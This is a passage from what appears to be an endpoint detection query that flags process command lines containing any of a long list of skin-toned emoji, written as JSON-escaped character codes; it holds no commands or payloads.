tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffd\" or tgt.process.cmdline contains \"\u261d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffd\" or tgt.process.cmdline contains \"\u270a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffd\" or tgt.process.cmdline contains \"\u270d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc75\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc74\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc72\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc73\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc77\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc82\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd75\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2695\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf3e\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf73\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf93\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa4\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfeb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfed\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udcbc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd27\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\udd2c\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udfa8\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude92\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2708\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83d\ude80\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2696\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc70\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd35\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc78\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd34\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd77\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb8\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddb9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd36\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf84\" or tgt.process.cmdline contains \"\ud83c\udf85\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddd\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddb\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udddc\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddda\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc7c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd30\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udec3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd31\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83c\udf7c\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude47\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc81\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude45\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude46\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4b\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddcf\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd26\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd37\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\ude4d\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc87\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc86\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd6\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc83\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd7a\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udd74\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddbc\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb6\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\ud83e\uddaf\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddce\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc3\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddcd\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc6d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6c\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc6b\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd7\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc7\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc2\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcc\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfc4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udea3\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfca\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\" or tgt.process.cmdline contains \"\u26f9\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83c\udfcb\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb4\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udeb5\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd38\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd3d\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd3e\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\udd39\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd8\ud83c\udffd\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udec0\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udecc\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc4b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd90\ud83c\udffe\" or tgt.process.cmdline contains \"\u270b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd96\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd0c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd0f\ud83c\udffe\" or tgt.process.cmdline contains \"\u270c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1e\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef0\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd18\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd19\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef3\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc48\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc49\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc46\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udd95\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc47\ud83c\udffe\" or tgt.process.cmdline contains \"\u261d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4e\ud83c\udffe\" or tgt.process.cmdline contains \"\u270a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4a\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1b\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd1c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc4f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udef6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4c\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc50\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\udd32\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\ude4f\ud83c\udffe\" or tgt.process.cmdline contains \"\u270d\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udcaa\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb5\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddb6\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc42\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddbb\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc43\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc76\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc67\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd2\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc66\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb1\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb0\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc71\ud83c\udffe\u200d\u2642\ufe0f\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb3\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\ud83e\uddb2\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2640\ufe0f\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd4\ud83c\udffe\u200d\u2642\ufe0f\" or 